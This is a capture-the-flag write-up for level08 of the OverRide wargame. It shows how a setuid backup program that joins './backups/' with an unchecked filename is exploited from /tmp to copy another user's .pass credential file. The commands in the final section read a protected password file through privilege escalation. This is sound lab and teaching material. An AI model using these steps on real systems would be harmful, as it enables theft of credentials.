# LEVEL08

## 1. Inspect The Executable

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level08/level08
level08@OverRide:~$ ls -l
total 16
drwxrwx---+ 1 level09 users    60 Oct 19  2016 backups
-rwsr-s---+ 1 level09 users 12975 Oct 19  2016 level08
level08@OverRide:~$ ls -lar backups/
total 4
-rwxrwx---+ 1 level09 users    32 Feb 18 23:41 .log
dr-xr-x---+ 1 level08 level08 100 Oct 19  2016 ..
drwxrwx---+ 1 level09 users    60 Oct 19  2016 .
```

We can see that the binary has the `s` bit set on the **execution permission**, which means the program will run with **`level09` privileges**.

There is also a `backups/` directory with a `.log` file in it, both belonging to `level09`. The binary can access `./backups/.log` when running with elevated privileges. The `level08` user can read the `.log` file.


```bash
level08@OverRide:~$ ./level08 
Usage: ./level08 filename
ERROR: Failed to open (null)
level08@OverRide:~$ ./level08 backups/.log 
ERROR: Failed to open ./backups/backups/.log
level08@OverRide:~$ echo "test" > /tmp/test
level08@OverRide:~$ ./level08 /tmp/test 
ERROR: Failed to open ./backups//tmp/test
level08@OverRide:~$ cat backups/.log 
LOG: Starting back up: /tmp/test
```

The program takes a filename as argument, attempts to copy it to `./backups/<filename>`, and logs the operation to `backups/.log`.

## 2. Analyze The Executable

```bash
(gdb) info functions 
All defined functions:

Non-debugging symbols:
[...]
0x00000000004008c4  log_wrapper
0x00000000004009f0  main
[...]
```

Using the gdb command `info functions`, we can list all functions present in the binary.
Here, we find 2 functions: `main`, and `log_wrapper`.

### Program Behavior

#### main function

The `main` function takes a filename argument, opens `./backups/.log` for logging, then reads the source file byte-by-byte and writes to a destination file constructed as `./backups/` + filename.

#### log_wrapper function

The `log_wrapper` function logs messages to the log file.

## 3. Identify The Vulnerability

The vulnerability lies in how the program constructs the destination path:
```c
	builtin_strncpy(local_78, "./backups/", 0xb);
	[...]
	strncat(local_78, (char *)param_2[1], 99 - (~uVar4 - 1));
```

The program concatenates `"./backups/"` with the user-provided filename without validation. If we provide an **absolute path** like `/home/users/level09/.pass`, the result becomes :

```
./backups/home/users/level09/.pass
```

This creates a relative path from the current working directory. The program will:
- Read `/home/users/level09/.pass` *(has permission because it runs as level09)*.
- Write to `./backups/home/users/level09/.pass` *(relative to current directory)*.

By executing the program from `/tmp` and creating the directory structure `/tmp/backups/home/users/level09/`, we can trick the program into copying the `.pass` file to a location readable by the `level08` user.

## 4. Capture The Flag

```bash
level08@OverRide:~$ cd /tmp
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
level08@OverRide:/tmp$ touch backups/.log
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/.log 
LOG: Starting back up: /home/users/level09/.pass
LOG: Finished back up /home/users/level09/.pass
level08@OverRide:/tmp$ cat /tmp/backups/home/users/level09/.pass
XXX
```